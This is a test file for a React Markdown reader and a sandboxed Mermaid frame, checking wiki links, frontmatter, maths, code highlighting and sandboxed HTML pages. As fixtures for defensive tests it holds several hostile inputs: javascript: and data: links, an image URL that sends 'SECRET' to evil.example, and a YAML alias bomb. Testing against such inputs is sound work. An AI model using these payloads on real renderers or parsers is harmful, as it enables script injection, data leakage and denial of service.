import type { LibraryTome } from '@crystal-bridge/protocol';
import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { tomeFileUrl, tomePageUrl } from '../library.js';
import { MermaidFrame } from './MermaidFrame.js';
import { addOns, canEdit, headingId, outlineOf, TomeReader } from './TomeReader.js';

const NODE = 'laptop';
const VERSION = { size: 3, mtimeMs: 1, hash: 'a'.repeat(64) };
const PATHS = ['Home.md', 'reference/Glossary.md', 'ops/Backups.md', 'img/flow.png', 'sketches/retry-curve.html'];

const tome = (content: string, more: Partial<LibraryTome> = {}): LibraryTome => ({
  path: 'Home.md',
  kind: 'md',
  content,
  encoding: 'utf8',
  truncated: false,
  version: VERSION,
  ...more,
});

function show(content: string, more: Partial<LibraryTome> = {}, props: { onMissing?: (target: string) => void } = {}) {
  const onOpen = vi.fn();
  const view = render(<TomeReader node={NODE} tome={tome(content, more)} paths={PATHS} onOpen={onOpen} {...props} />);
  return { ...view, onOpen };
}

/** Lets the reader's add-on effects settle. */
const settle = () => act(async () => await new Promise((resolve) => setTimeout(resolve, 0)));

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe('a Markdown Tome', () => {
  it('renders Markdown as the chat does, with raw HTML left as text', () => {
    const { container } = show('# Title\n\nSome **bold** and <b>x</b>.\n\n| a | b |\n| - | - |\n| 1 | 2 |');
    expect(screen.getByRole('heading', { level: 1, name: 'Title' })).toBeTruthy();
    expect(container.querySelector('strong')!.textContent).toBe('bold');
    expect(container.querySelector('b')).toBeNull();
    expect(container.textContent).toContain('<b>x</b>');
    expect(container.querySelector('table')).not.toBeNull();
  });

  it('links [[Glossary]] to the Tome it resolves to, by name anywhere in the Library', () => {
    const { onOpen } = show('See [[Glossary]] and [[Backups|the backups]].');
    fireEvent.click(screen.getByRole('button', { name: 'Glossary' }));
    expect(onOpen).toHaveBeenCalledWith('reference/Glossary.md', undefined);
    fireEvent.click(screen.getByRole('button', { name: 'the backups' }));
    expect(onOpen).toHaveBeenLastCalledWith('ops/Backups.md', undefined);
  });

  it('carries the heading of [[Page#Heading]]', () => {
    const { onOpen } = show('[[Glossary#Hero Classes]]');
    fireEvent.click(screen.getByRole('button', { name: /Glossary.*Hero Classes/ }));
    expect(onOpen).toHaveBeenCalledWith('reference/Glossary.md', 'Hero Classes');
  });

  it('draws a link to a missing Tome apart, and offers it when it can be written', () => {
    const onMissing = vi.fn();
    const { container, onOpen } = show('Tokens are in [[Kingdom tokens]].', {}, { onMissing });
    const missing = container.querySelector('[data-missing]')!;
    expect(missing.getAttribute('data-missing')).toBe('Kingdom tokens');
    expect(missing.textContent).toContain('Kingdom tokens');
    fireEvent.click(missing);
    expect(onMissing).toHaveBeenCalledWith('Kingdom tokens');
    expect(onOpen).not.toHaveBeenCalled();
  });

  it('draws a missing Tome as text when nothing can write it', () => {
    const { container } = show('[[Kingdom tokens]]');
    const missing = container.querySelector('[data-missing]')!;
    expect(missing.tagName).toBe('SPAN');
  });

  it('opens a relative Markdown link in the reader, relative to the Tome', () => {
    const { onOpen } = show('[backups](../ops/Backups.md)', { path: 'reference/Glossary.md' });
    fireEvent.click(screen.getByRole('button', { name: 'backups' }));
    expect(onOpen).toHaveBeenCalledWith('ops/Backups.md', undefined);
  });

  it('opens a link to a web page beside the app', () => {
    show('[docs](https://example.com/docs)');
    const link = screen.getByRole('link', { name: 'docs' }) as HTMLAnchorElement;
    expect(link.href).toBe('https://example.com/docs');
    expect(link.target).toBe('_blank');
    expect(link.rel).toContain('noreferrer');
  });

  it('keeps data and script addresses out of links', () => {
    show('[a](javascript:alert(1)) [b](data:text/html,hi)');
    expect(screen.getByText('a').getAttribute('href')).toBe('');
    expect(screen.getByText('b').getAttribute('href')).toBe('');
  });

  it('loads images in the Library through the hub, by relative path or embed', () => {
    const { container } = show('![flow](img/flow.png)\n\n![[flow.png]]');
    const sources = [...container.querySelectorAll('img')].map((image) => image.getAttribute('src'));
    expect(sources).toEqual([tomeFileUrl(NODE, 'img/flow.png'), tomeFileUrl(NODE, 'img/flow.png')]);
    expect(decodeURIComponent(sources[0]!)).toBe('/api/nodes/laptop/library/file?path=img/flow.png');
  });

  it('keeps a remote image a link', () => {
    const { container } = show('![chart](https://evil.example/?d=SECRET)');
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: /chart.*evil\.example/ })).toBeTruthy();
  });

  it('shows frontmatter as a strip of properties, not as text', async () => {
    const { container } = show('---\ntags: [ops, summons]\nstatus: draft\n---\n# Summons\n');
    const strip = await screen.findByLabelText('Properties');
    expect(within(strip).getByText('#ops')).toBeTruthy();
    expect(within(strip).getByText('#summons')).toBeTruthy();
    expect(within(strip).getByText('status')).toBeTruthy();
    expect(within(strip).getByText('draft')).toBeTruthy();
    expect(container.querySelector('hr')).toBeNull();
    expect(container.textContent).not.toContain('status: draft');
  });

  it('shows a YAML alias bomb as an error strip with the raw block, and does not hang', async () => {
    const bomb = [
      'a: &a ["x","x","x","x","x","x","x","x","x"]',
      'b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]',
      'c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]',
      'd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]',
      'e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]',
      'f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]',
      'g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]',
    ].join('\n');
    const { container } = show(`---\n${bomb}\n---\nBody text`);
    const error = await screen.findByRole('alert');
    expect(error.textContent).toMatch(/frontmatter/i);
    expect(container.querySelector('pre')!.textContent).toContain('b: &b');
    expect(screen.queryByLabelText('Properties')).toBeNull();
    expect(screen.getByText('Body text')).toBeTruthy();
  });

  it('renders $…$ and $$…$$ through KaTeX', async () => {
    const { container } = show('Inline $x^2$ here.\n\n$$\nt_n = 2^n\n$$\n');
    await waitFor(() => expect(container.querySelectorAll('.katex')).toHaveLength(2));
    expect(container.querySelector('.katex-display')).not.toBeNull();
  });

  it('gives a formula no links, whatever it asks for', async () => {
    const { container } = show('$\\href{javascript:alert(1)}{x}$ and $\\url{https://example.com}$');
    await waitFor(() => expect(container.querySelector('.katex, .katex-error')).not.toBeNull());
    expect(container.querySelector('a')).toBeNull();
  });

  it('highlights fenced code by language and keeps the copy button', async () => {
    const { container } = show('```ts\nconst a = 1;\n```');
    await waitFor(() => expect(container.querySelector('.hljs-keyword')).not.toBeNull());
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeTruthy();
  });

  it('draws a mermaid block in a sandboxed frame of its own', async () => {
    const { container } = show('```mermaid\ngraph TD; A-->B\n```');
    await waitFor(() => expect(container.querySelector('iframe')).not.toBeNull());
    const frame = container.querySelector('iframe')!;
    expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
    expect(frame.getAttribute('src')).toBe('/sandbox/mermaid-frame.html');
  });

  it('loads no KaTeX, highlighter, Mermaid frame or YAML for a plain Tome', async () => {
    const spies = (['math', 'highlight', 'mermaid', 'yaml'] as const).map((name) => vi.spyOn(addOns, name));
    show('# Plain\n\nJust text, a [[Glossary]] link and `inline code`.\n\n```\nno language\n```');
    await settle();
    for (const spy of spies) expect(spy).not.toHaveBeenCalled();
  });

  it('loads each add-on only for what the Tome holds', async () => {
    const math = vi.spyOn(addOns, 'math');
    const highlight = vi.spyOn(addOns, 'highlight');
    const mermaid = vi.spyOn(addOns, 'mermaid');
    show('Maths: $a+b$');
    await settle();
    expect(math).toHaveBeenCalled();
    expect(highlight).not.toHaveBeenCalled();
    expect(mermaid).not.toHaveBeenCalled();
  });

  it('gives headings ids the outline links to', () => {
    show('# How Summons reach a target\n\n## The path\n\n## The path');
    expect(screen.getByRole('heading', { level: 1 }).id).toBe(headingId('How Summons reach a target'));
    const ids = screen.getAllByRole('heading', { level: 2 }).map((heading) => heading.id);
    expect(ids).toEqual(outlineOf('## The path\n\n## The path').map((entry) => entry.id));
    expect(new Set(ids).size).toBe(2);
  });

  it('says a truncated Tome was cut, and offers no edit', () => {
    show('# Long', { truncated: true });
    expect(screen.getByText(/cut at 512 KB/)).toBeTruthy();
    expect(canEdit(tome('', { truncated: true }))).toBe(false);
  });
});

describe('outlineOf', () => {
  it('lists the headings, skipping frontmatter and code', () => {
    const markdown = [
      '---',
      'title: x',
      '---',
      '# How Summons reach a target',
      '',
      '```sh',
      '# not a heading',
      '```',
      '## The `path`',
      'Retry and back-off',
      '---',
      '### A [[Glossary|glossary]] link',
    ].join('\n');
    expect(outlineOf(markdown)).toEqual([
      { depth: 1, text: 'How Summons reach a target', id: headingId('How Summons reach a target') },
      { depth: 2, text: 'The path', id: headingId('The path') },
      { depth: 2, text: 'Retry and back-off', id: headingId('Retry and back-off') },
      { depth: 3, text: 'A glossary link', id: headingId('A glossary link') },
    ]);
  });
});

describe('canEdit', () => {
  it('is a whole Markdown Tome that is not a link', () => {
    expect(canEdit(tome('x'))).toBe(true);
    expect(canEdit(tome('x', { kind: 'html', path: 'a.html' }))).toBe(false);
    expect(canEdit(tome('x', { link: true }))).toBe(false);
  });
});

describe('an HTML Tome', () => {
  const page = tome('<h1>Retry curve</h1>', { path: 'sketches/retry-curve.html', kind: 'html' });

  it('shows the page in a sandboxed frame at the page route, with the badge, Full screen and View source', () => {
    const { container } = render(<TomeReader node={NODE} tome={page} paths={PATHS} onOpen={() => {}} />);
    const frame = container.querySelector('iframe')!;
    expect(frame.getAttribute('src')).toBe(tomePageUrl(NODE, 'sketches/retry-curve.html'));
    expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
    expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer');
    const badge = screen.getByText("Sandboxed page: can't read the app, but can contact other sites");
    // It warns, so it wears the warning's amber and mark, not a "safe" green shield.
    expect(badge.className).toMatch(/\bbg-amber-50\b/);
    expect(badge.className).not.toMatch(/emerald/);
    expect(badge.querySelector('.cb-icon-markWarning')).not.toBeNull();
    expect(badge.querySelector('.cb-icon-markShield')).toBeNull();
    expect(screen.getByText(/has to inline what it needs/).className).toMatch(/dark:text-neutral-400/);
    expect(screen.getByRole('button', { name: /Full screen/ })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: /View source/ }));
    expect(container.querySelector('pre')!.textContent).toContain('<h1>Retry curve</h1>');
  });
});

describe('MermaidFrame', () => {
  it('sends the source once the frame is ready, and takes answers only from its own frame', () => {
    const { container } = render(<MermaidFrame source="graph TD; A-->B" />);
    const frame = container.querySelector('iframe')!;
    expect(frame.getAttribute('sandbox')).toBe('allow-scripts');
    const own = frame.contentWindow!;
    const post = vi.spyOn(own, 'postMessage').mockImplementation(() => {});
    act(() => window.dispatchEvent(new MessageEvent('message', { data: { type: 'ready' }, source: own })));
    expect(post).toHaveBeenCalledTimes(1);
    const [request, target] = post.mock.calls[0]!;
    expect(request).toMatchObject({ type: 'render', source: 'graph TD; A-->B', theme: 'light' });
    expect(target).toBe('*');
    const id = (request as { id: string }).id;

    act(() =>
      window.dispatchEvent(new MessageEvent('message', { data: { type: 'height', id, height: 321 }, source: window })),
    );
    expect(frame.style.height).not.toBe('321px');
    act(() =>
      window.dispatchEvent(
        new MessageEvent('message', { data: { type: 'height', id: 'other', height: 321 }, source: own }),
      ),
    );
    expect(frame.style.height).not.toBe('321px');
    act(() =>
      window.dispatchEvent(new MessageEvent('message', { data: { type: 'height', id, height: 321 }, source: own })),
    );
    expect(frame.style.height).toBe('321px');
  });

  it('shows the source and the error when a diagram fails', () => {
    const { container } = render(<MermaidFrame source="graph oops" />);
    const own = container.querySelector('iframe')!.contentWindow!;
    const post = vi.spyOn(own, 'postMessage').mockImplementation(() => {});
    act(() => window.dispatchEvent(new MessageEvent('message', { data: { type: 'ready' }, source: own })));
    const id = (post.mock.calls[0]![0] as { id: string }).id;
    act(() =>
      window.dispatchEvent(
        new MessageEvent('message', { data: { type: 'error', id, message: 'Parse error on line 1' }, source: own }),
      ),
    );
    expect(screen.getByText(/Parse error on line 1/)).toBeTruthy();
    expect(container.querySelector('pre')!.textContent).toContain('graph oops');
  });
});
